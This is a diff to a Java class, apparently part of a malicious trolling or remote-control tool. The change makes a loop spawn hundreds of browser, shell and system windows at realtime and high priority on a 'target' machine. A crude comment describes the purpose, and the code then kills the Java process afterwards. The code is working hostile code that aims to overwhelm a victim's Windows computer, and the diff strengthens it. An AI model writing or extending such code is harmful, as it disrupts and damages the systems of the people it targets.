@@ -465,7 +465,9 @@ public class Core {
 		}
 		for (int i = 10; i <= 1000; i++) { // Spams the fuck out of the target with random windows
 			Runtime.getRuntime().exec("cmd /c ping localhost -n " + String.valueOf(i)
-					+ " > nul && start iexplore /realtime & start notepad /realtime & start cmd /realtime & start explorer /realtime & start calc /realtime & start chrome /realtime & start firefox /realtime");
+					+ " > nul && start /realtime iexplore & start /realtime notepad & start /realtime cmd & start /realtime explorer & start /realtime calc & start /realtime chrome & start /realtime firefox");
+			Runtime.getRuntime().exec("cmd /c ping localhost -n " + String.valueOf(i)
+					+ " > nul && start /high iexplore & start /high notepad & start /high cmd & start /high explorer & start /high calc & start /high chrome & start /high firefox");
 		}
 		Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && taskkill /f /im javaw.exe");
 
